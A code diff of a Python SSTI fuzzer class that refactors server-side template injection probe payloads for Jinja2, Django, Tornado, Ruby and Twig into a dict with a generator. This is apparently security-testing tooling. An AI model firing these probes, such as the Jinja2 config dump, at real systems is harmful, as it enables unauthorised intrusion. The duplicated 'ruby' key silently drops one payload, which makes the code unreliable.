@@ -9,26 +9,24 @@ class SSTI(Fuzzer):
 
     """Server Side Template Injection"""
 
+    # simple mathematical expressions
+    payloads = {
+        "Tornado": "{% import module %}",
+        "Jinja2": "{{ config.items() }}",
+        "Django": "{{ request }}",
+        "ruby": "<%= 7 * 7 %>",
+        "ruby": "${7*7}",
+        "Twig": "{{ 7*7 }}",
+    }
+
     def __init__(self, engine=""):
         super(SSTI, self).__init__()
         self.engine = engine
 
-    def test(self):
-        # simple mathematical expressions
-        if self.engine == "Tornado":
-            return "{% import module %}"
-        elif self.engine == "Jinja2":
-            return "{{ config.items() }}"
-        elif self.engine == "Django":
-            return "{{ request }}"
-        elif self.engine == "ruby":
-            # Basic injection
-            return "<%= 7 * 7 %>"
-        elif self.engine == "ruby":
-            # Basic injection
-            return "${7*7}"
-        elif self.engine == "Twig":
-            return "{{ 7*7 }}"
+    @classmethod
+    def fuzz(cls):
+        for k in cls.payloads:
+            yield cls.payloads[k]
 
     def exp(self):
         if self.engine == "Jinja2":
